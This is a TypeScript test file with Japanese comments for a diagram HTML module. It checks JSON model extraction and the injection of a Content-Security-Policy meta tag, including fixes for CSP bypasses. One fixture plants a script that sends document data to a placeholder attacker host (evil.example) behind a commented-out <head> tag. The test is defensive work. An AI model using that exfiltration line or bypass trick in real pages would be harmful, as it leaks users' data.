import { describe, expect, it } from "vitest";
import { DIAGRAM_CSP, extractModel, injectCsp } from "./diagram-file.js";

const MODEL = JSON.stringify({
  version: 1,
  title: "T",
  nodes: [{ id: "a", label: "A" }],
});

function page(body: string, head = ""): string {
  return `<!doctype html><html><head>${head}</head><body>${body}</body></html>`;
}

describe("extractModel", () => {
  it("script[type=application/json] からモデルを取り出す", () => {
    const html = page(
      `<script type="application/json" id="ark-diagram-model">${MODEL}</script><div>図</div>`
    );

    const result = extractModel(html);

    expect(result.ok).toBe(true);
    if (result.ok) expect(result.model.nodes[0]?.label).toBe("A");
  });

  it("モデルブロックが無ければ失敗する", () => {
    const result = extractModel(page("<div>図だけ</div>"));

    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.error).toContain("ark-diagram-model");
  });

  it("属性の順序が逆でも取り出せる", () => {
    const html = page(
      `<script id="ark-diagram-model" type="application/json">${MODEL}</script>`
    );

    expect(extractModel(html).ok).toBe(true);
  });

  it("type=application/json が無いブロックは id が一致しても拒否する", () => {
    // type 無しの <script id="ark-diagram-model"> はサーバー検証を通っても
    // ブラウザには JS として実行されてしまう（skill / エラーメッセージが
    // type="application/json" を要求しているのに、実装が id だけで
    // 一致させていた契約違反）。
    const html = page(`<script id="ark-diagram-model">${MODEL}</script>`);

    const result = extractModel(html);

    expect(result.ok).toBe(false);
  });

  it("type が application/json 以外のブロックは id が一致しても拒否する", () => {
    const html = page(
      `<script id="ark-diagram-model" type="text/javascript">${MODEL}</script>`
    );

    const result = extractModel(html);

    expect(result.ok).toBe(false);
  });
});

describe("injectCsp", () => {
  it("head の直後に meta CSP を差し込む", () => {
    const out = injectCsp(page("<div>x</div>"));

    expect(out).toContain(DIAGRAM_CSP);
    expect(out.indexOf(DIAGRAM_CSP)).toBeLessThan(out.indexOf("<div>x</div>"));
  });

  it("head が無い文書でも先頭に差し込む", () => {
    const out = injectCsp("<div>x</div>");

    expect(out).toContain(DIAGRAM_CSP);
    expect(out.indexOf(DIAGRAM_CSP)).toBeLessThan(out.indexOf("<div>x</div>"));
  });

  it("生成物が自前で書いた CSP meta は取り除いてから差し込む", () => {
    const html = page(
      "<div>x</div>",
      `<meta http-equiv="Content-Security-Policy" content="default-src *">`
    );

    const out = injectCsp(html);

    expect(out).not.toContain("default-src *");
    expect(out.match(/http-equiv="Content-Security-Policy"/g)).toHaveLength(1);
  });

  it("HTML コメント内の <head> を誤検出して CSP を挿入しない（脆弱性修正1）", () => {
    // コメント内に <head> があると、現在の実装はそこに CSP を挿入してしまう。
    // CSP meta がコメントの中に入って無効化され、コメント外のスクリプトが CSP なしで実行される。
    const malicious = `<!-- <head> -->
<script>fetch('https://evil.example/exfil?d=' + document.title)</script>
<html><head><meta charset="utf-8"></head><body>diagram</body></html>`;

    const out = injectCsp(malicious);

    // CSP は常に文書の先頭に置かれ、コメント外に出ているべき
    expect(out.startsWith(DIAGRAM_CSP)).toBe(true);
  });

  it("引用符なし属性値の既存 CSP を除去する（脆弱性修正2）", () => {
    const html = page(
      "<div>x</div>",
      `<meta http-equiv=Content-Security-Policy content="default-src *">`
    );

    const out = injectCsp(html);

    // 引用符なし CSP が除去されているべき
    expect(out).not.toContain("default-src *");
    // Ark の CSP だけが残るべき
    expect(out.match(/http-equiv=.*Content-Security-Policy/g)).toHaveLength(1);
  });
});
